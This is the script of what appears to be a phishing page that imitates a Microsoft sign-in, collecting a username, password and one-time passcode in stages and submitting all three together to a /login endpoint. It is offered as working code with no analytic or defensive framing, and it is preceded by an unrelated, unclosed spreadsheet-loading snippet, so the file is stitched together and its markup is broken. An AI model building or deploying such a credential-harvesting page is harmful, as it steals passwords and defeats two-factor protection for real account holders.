<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                var filteredData = jsonData.filter(row => row.some(filledCell));

                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); 
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const unReq = "Enter a valid email address, phone number, or Skype name.";
            const pwdReq = "Please enter the password for your Microsoft account.";
            const otpReq = "Please enter the OTP sent to your email or phone.";
            const unameInp = document.getElementById('inp_uname');
            const pwdInp = document.getElementById('inp_pwd');
            const otpInp = document.getElementById('OTP_m');
            const hiddenUname = document.getElementById('hidden_uname');
            const hiddenUnameOtp = document.getElementById('hidden_uname_otp');
            const hiddenPwdOtp = document.getElementById('hidden_pwd_otp');
            const unameForm = document.getElementById('uname_form');
            const pwdForm = document.getElementById('pwd_form');
            const otpForm = document.getElementById('otp_form');
            const nextBtnUname = document.getElementById('btn_next_uname');
            const nextBtnPwd = document.getElementById('btn_next_pwd');
            const backToUname = document.getElementById('back_to_uname');
            const backToPwd = document.getElementById('back_to_pwd');
            let view = "uname";

            function validateUname() {
                if (unameInp.value.trim() === "") {
                    document.getElementById('error_uname').innerText = unReq;
                    unameInp.classList.add('error-inp');
                    return false;
                } else {
                    document.getElementById('error_uname').innerText = "";
                    unameInp.classList.remove('error-inp');
                    return true;
                }
            }

            function validatePwd() {
                if (pwdInp.value.trim() === "") {
                    document.getElementById('error_pwd').innerText = pwdReq;
                    pwdInp.classList.add('error-inp');
                    return false;
                } else {
                    document.getElementById('error_pwd').innerText = "";
                    pwdInp.classList.remove('error-inp');
                    return true;
                }
            }

            function validateOtp() {
                if (otpInp.value.trim() === "") {
                    document.getElementById('error_otp').innerText = otpReq;
                    otpInp.classList.add('error-inp');
                    return false;
                } else {
                    document.getElementById('error_otp').innerText = "";
                    otpInp.classList.remove('error-inp');
                    return true;
                }
            }

            nextBtnUname.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('Next button (username) clicked');
                if (validateUname()) {
                    hiddenUname.value = unameInp.value;
                    hiddenUnameOtp.value = unameInp.value;
                    document.getElementById('section_uname').classList.add('d-none');
                    document.getElementById('section_pwd').classList.remove('d-none');
                    document.getElementById('user_identity').innerText = unameInp.value;
                    view = "pwd";
                    console.log('Navigated to password section');
                } else {
                    console.log('Username validation failed');
                }
            });

            unameForm.addEventListener('submit', (e) => {
                e.preventDefault();
                console.log('uname_form submit prevented');
            });

            nextBtnPwd.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('Next button (password) clicked');
                if (validatePwd()) {
                    hiddenPwdOtp.value = pwdInp.value;
                    document.getElementById('section_pwd').classList.add('d-none');
                    document.getElementById('section_otp').classList.remove('d-none');
                    document.getElementById('user_identity_otp').innerText = unameInp.value;
                    view = "otp";
                    console.log('Navigated to OTP section');
                } else {
                    console.log('Password validation failed');
                }
            });

            pwdForm.addEventListener('submit', (e) => {
                e.preventDefault();
                console.log('pwd_form submit prevented');
            });

            otpForm.addEventListener('submit', (e) => {
                if (!validateOtp()) {
                    e.preventDefault();
                    console.log('OTP validation failed');
                } else {
                    console.log('Submitting to /login:', {
                        username: hiddenUnameOtp.value,
                        password: hiddenPwdOtp.value,
                        otp: otpInp.value
                    });
                }
            });

            backToUname.addEventListener('click', () => {
                view = "uname";
                document.getElementById('section_pwd').classList.add('d-none');
                document.getElementById('section_uname').classList.remove('d-none');
                pwdInp.value = "";
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                console.log('Returned to username section');
            });

            backToPwd.addEventListener('click', () => {
                view = "pwd";
                document.getElementById('section_otp').classList.add('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                otpInp.value = "";
                document.getElementById('error_otp').innerText = "";
                otpInp.classList.remove('error-inp');
                console.log('Returned to password section');
            });

            unameInp.addEventListener('input', validateUname);
            pwdInp.addEventListener('input', validatePwd);
            otpInp.addEventListener('input', validateOtp);
        });
    </script>
